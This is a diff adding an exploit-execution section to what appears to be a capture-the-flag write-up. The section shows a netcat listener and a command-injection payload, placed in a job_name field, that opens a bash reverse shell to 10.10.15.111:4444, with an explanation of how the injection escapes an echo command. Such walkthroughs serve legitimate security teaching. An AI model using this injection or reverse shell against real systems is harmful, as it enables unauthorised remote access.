@@ -513,6 +513,29 @@ if __name__ == "__main__":
 <br>
 </div>
 
+### 3.2 Exploit Execution — Foothold as `lp`
+
+**Command (attacker, terminal 1):** `python3 foothold.py`
+
+**Command (attacker, terminal 2):** `nc -lvnp 4444`
+
+**Breakdown:**
+
+- `nc -lvnp 4444`
+    - **Description:** Netcat listener — `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p 4444` bind port.
+    - **Purpose:** Catch the reverse shell the injected `bash -i >& /dev/tcp/...` payload connects back with.
+
+**Payload (the injected `job_name`):**
+
+python
+
+```python
+job_name = "'; bash -c 'bash -i >& /dev/tcp/10.10.15.111/4444 0>&1'; #"
+```
+
+When interpolated into `echo 'Archive: {job_name}' >> /tmp/archive.log`, the leading `'` closes the server's `echo` string, `;` separates statements, `bash -c '...'` spawns the reverse shell, and `#` comments out the trailing redirect — producing three valid shell statements.
+
+**Result:**
 <div align="center">
 <br>
 <br>
